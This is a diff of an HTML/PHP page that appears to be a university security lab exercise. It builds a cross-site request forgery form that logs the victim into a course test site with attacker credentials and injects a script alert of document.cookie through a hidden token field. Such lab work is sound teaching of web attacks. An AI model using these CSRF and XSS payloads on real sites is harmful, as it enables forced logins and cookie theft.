@@ -1,10 +1,13 @@
+<?php
+	$inject = "&lt;script&gt;alert(document.cookie);&lt;/script&gt;";
+?>
 <html>
 <iframe style='display:none' name='csrf-frame'></iframe>
 
-<form name="loginForm" id="login" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post" target='csrf-frame'>
+<form name="loginForm" id="login" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post">
     <input type='hidden' name="username" value="attacker">
     <input type='hidden' name="password" value="l33th4x">
-    <input type='hidden' id = 'csrf_token' name='csrf_token' value='<script>alert(document.cookie)</script>'>
+    <input type='hidden' id = 'csrf_token' name='csrf_token' value=&lt;script&gt;alert(document.cookie);&lt;/script&gt;>
 </form>
 
 <form name="search" id="search" action="http://trurl.cs.illinois.edu/" method="post">
